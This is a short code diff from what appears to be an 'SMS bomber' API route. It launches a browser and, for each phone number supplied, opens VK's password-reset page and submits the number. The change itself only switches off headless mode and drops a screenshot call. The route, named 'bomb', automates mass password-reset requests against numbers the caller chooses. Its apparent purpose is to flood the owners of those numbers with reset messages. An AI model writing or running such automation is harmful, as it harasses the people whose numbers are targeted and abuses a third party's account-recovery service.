@@ -17,14 +17,13 @@ export default async function bomb(req: NextApiRequest, res: NextApiResponse) {
   
   const phoneNumbers = phoneNumbersStr.split(" ");
 
-  const browser = await getBrowser({ headless: true });
+  const browser = await getBrowser({ headless: false });
   console.log("Browser launched...");
   
   const promises = phoneNumbers.map(async phoneNumber => {
     const page = await browser.newPage();
     
     await page.goto("https://id.vk.com/restore/#/resetPassword");
-    await page.screenshot({ path: "./img.jpeg"})
     
     await inputPhoneNumber(page, phoneNumber);
     await pressEnter(page);
